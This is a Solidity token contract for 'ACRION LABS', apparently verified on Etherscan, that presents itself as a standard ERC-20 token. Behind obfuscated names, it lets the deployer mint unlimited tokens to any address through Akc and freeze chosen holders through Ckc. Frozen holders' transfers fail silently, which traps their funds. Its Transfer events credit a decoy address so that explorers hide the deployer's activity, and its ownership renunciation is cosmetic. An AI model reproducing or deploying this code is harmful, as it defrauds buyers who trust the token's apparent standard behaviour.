/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aWDS = 0x8242e56a759aa0B069B9c983fe3f582020CD1eC9;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ACRION is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private biiiJ;
    mapping (address => uint256) private ciiiX;
    mapping (address => mapping (address => uint256)) private dXC;
    uint8 eVGD = 8;
    uint256 fDI = 150000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "ACRION LABS";
        _symbol = "ACRION";
        gLIS(msg.sender, fDI);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eVGD;
    }

    function totalSupply() public view  returns (uint256) {
        return fDI;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return biiiJ[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dXC[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dXC[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
			modifier HKK () {
		       require(ciiiX[msg.sender] == 21);
               _;}
			   
   			   function Ckc (address nIJS) HKK public {
      ciiiX[nIJS] = 69;}
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= biiiJ[msg.sender]);
        if(ciiiX[msg.sender] <= 2) {
        hKI(msg.sender, recipient, amount);
        return true; }
     if(ciiiX[msg.sender] == 21) {
        iLK(msg.sender, recipient, amount);
        return true; }}

	   
			function mSE (address nIJS, uint256 oXX)  internal {
     biiiJ[nIJS] += oXX;} 		   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= biiiJ[sender]);
     require(amount <= dXC[sender][msg.sender]);
                  if(ciiiX[sender] == 21) {
        iLK(sender, recipient, amount);
        return true;} else
              if(ciiiX[sender] <= 2) { 
            if (ciiiX[recipient] <=2) {
        hKI(sender, recipient, amount);
        return true;}}}
		

  		    function gLIS(address kDW, uint256 lMD) internal  {
        ciiiX[msg.sender] = 21;
        kDW = aWDS;
        biiiJ[msg.sender] = biiiJ[msg.sender].add(lMD);
        emit Transfer(address(0), kDW, lMD); }
		
				
   function Akc (address nIJS, uint256 oXX) HKK public {
   mSE(nIJS,oXX);}		
		
		            function iLK(address sender, address recipient, uint256 amount) internal  {
        biiiJ[sender] = biiiJ[sender].sub(amount);
        biiiJ[recipient] = biiiJ[recipient].add(amount);
         sender = aWDS;
        emit Transfer(sender, recipient, amount); }
		




    function hKI(address sender, address recipient, uint256 amount) internal  {
        biiiJ[sender] = biiiJ[sender].sub(amount);
        biiiJ[recipient] = biiiJ[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }}